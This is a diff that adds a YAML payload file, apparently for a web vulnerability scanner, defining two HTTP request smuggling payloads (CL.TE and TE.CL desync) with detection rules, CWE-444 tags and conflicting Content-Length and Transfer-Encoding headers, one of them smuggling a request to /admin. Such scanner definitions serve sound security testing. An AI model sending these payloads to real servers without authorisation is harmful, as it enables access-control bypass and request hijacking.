@@ -1,0 +1,24 @@
+id: http-smuggling
+name: HTTP request smuggling
+context:
+  server: ["nginx", "Apache", "HAProxy"]
+
+payloads:
+  - value: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
+    detect: { status_change: true }
+    id: smuggle-clte-01
+    title: "HTTP smuggling — CL.TE desync"
+    severity: critical
+    cwe: CWE-444
+    inject_as: raw_body
+    extra_headers:
+      Content-Length: "4"
+      Transfer-Encoding: "chunked"
+
+  - value: "GET / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n"
+    detect: { time_based_ms: 5000 }
+    id: smuggle-tecl-01
+    title: "HTTP smuggling — TE.CL desync"
+    severity: critical
+    cwe: CWE-444
+    inject_as: raw_body
